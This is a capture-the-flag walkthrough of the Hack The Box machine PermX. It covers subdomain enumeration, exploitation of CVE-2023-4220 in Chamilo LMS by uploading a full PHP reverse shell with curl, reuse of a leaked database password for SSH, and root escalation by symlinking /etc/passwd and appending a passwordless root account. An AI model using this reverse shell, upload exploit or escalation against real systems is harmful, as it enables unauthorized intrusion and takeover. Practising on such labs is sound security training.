# <div align="center">[PermX](https://app.hackthebox.com/machines/PermX)</div>

<div align="center">
  <img src="https://labs.hackthebox.com/storage/avatars/3ec233f1bf70b096a66f8a452e7cd52f.png"></img>
</div>

# Let start with Nmap scan
```
death@esther:~$ nmap -sV -sC 10.10.11.23 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 22:44 IST
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE    SERVICE           VERSION
22/tcp  open     ssh               OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp  open     http              Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
625/tcp filtered apple-xsrvr-admin
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.93 seconds

```
## Only 2 ports are open.
* ## SSH on port 22.
* ## HTTP on port 80.

## Add this to Hosts file.
```
echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
```
# Let nevigate to webstite
### At bottom of page we can see contacts are given :
* ### 123 Street, New York, USA
* ### +012 345 67890
* ### permx@htb.com

## So it have subdomains let find out.
## Taking Use of Ffuf.
```
ffuf -w ~/wordlists/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H "Host:FUZZ.premx.htb" -c -ms 200 -s
```
### Let start
```
death@esther:~$ ffuf -w ~/wordlists/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H "Host:FUZZ.premx.htb" -c -ms 200 -s

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: /home/death/wordlists/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.premx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response size: 200
________________________________________________

lms
www
:: Progress: [19966/19966] :: Job [1/1] :: 244 req/sec :: Duration: [0:01:15] :: Errors: 0 ::
```
### Let add this to Hosts file
```
echo "10.10.11.23 lms.permx.htb" | sudo tee -a /etc/hosts
```
### Let Nevigate to it

![Screenshot from 2024-08-26 23-49-52](https://github.com/user-attachments/assets/e9f12523-e683-4c11-b5d4-7ae83b4930d6)

## After little bit of search I just found there is a ```CVE-2023-4220``` exist.
* ## [CVE-2023-4220](https://starlabs.sg/advisories/23/23-4220/) We can upload a reverse shell here ```/main/inc/lib/javascript/bigupload/files```
## When i visited here http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/
## There already reverse shells exist, It reduce my work,

![Screenshot from 2024-08-27 00-05-58](https://github.com/user-attachments/assets/643ae1a3-b3c1-4070-9f46-912865d12932)


## Let upload own reverse shell, change Ip 
```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = 'X.X.X.X';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
## I'm saving this as ```php-shell.php``` , bez already shell.php present.
## Let reupload this:
```
curl -F 'bigUploadFile=@php-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
## Let execute our reverse shell open Netcat in another terminal
```
nc -lnvp 1234
```
## Here is our shell

![image](https://github.com/user-attachments/assets/4605f37b-5fd1-4b03-84a5-969f6a4a9dd1)

## To Execute Shell tap on it
```
death@esther:~/Lab/htb-labs/permx$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.11.23 45382
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 18:50:47 up  4:42,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## I Got this:
## To stable shell use this:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
### After looking for a while i found Configuration.php file located at 
```
cat /var/www/chamilo/app/config/configuration.php
```

## I found this:
```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```
## Let view number of users:
```
www-data@permx:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```
## Let login using SSH
* ## User = ```mtz```
* ## Pass = ```03F6lY3uXAP2bkW8```
```
death@esther:~/Lab/htb-labs/permx$ ssh mtz@10.10.11.23
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug 26 06:57:56 PM UTC 2024

  System load:           0.0
  Usage of /:            60.1% of 7.19GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             311
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.23
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5ea6

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 26 16:23:40 2024 from 10.10.14.91
mtz@permx:~$ 

```
## Let find User Flag
```
find / -type f -name user*.txt 2> /dev/null
```
## Here is our user flag
```
mtz@permx:~$ cat /home/mtz/user.txt
de308dd04225c886c8ca6b6a2ff92944
```
## As there is only 1 user can we use sudo commands let find out:
```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
## So this is the script
```
mtz@permx:~$ cd /opt
mtz@permx:/opt$ ls
acl.sh
mtz@permx:/opt$ 
```
## script

```
mtz@permx:/opt$ cat acl.sh 
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
mtz@permx:/opt$ 
```
## As i read the script  I saw that this script can be used to change permissions of any file in mtz home directory. But this file does not have write permissions. In order to do that
## Let create a symbolic link of /etc/passwd to mtz home directory
```
ln -s /etc/passwd /home/mtz/test
```
## Let give read and write permission:
```
sudo /opt/acl.sh mtz rw /home/mtz/test
```
## Then give permission to root3 by using echo on the symlink file, it work for both bez they are linked.
```
echo "root3::0:0:root3:/root:/bin/bash" >> ./test
```
## Let switch User
```
su root3
```
## Here is our Root Flag
```
root@permx:/home/mtz# cat /root/root.txt 
2e75395638c246ce3f50b67f55329255
```

# Thank You 
🙂
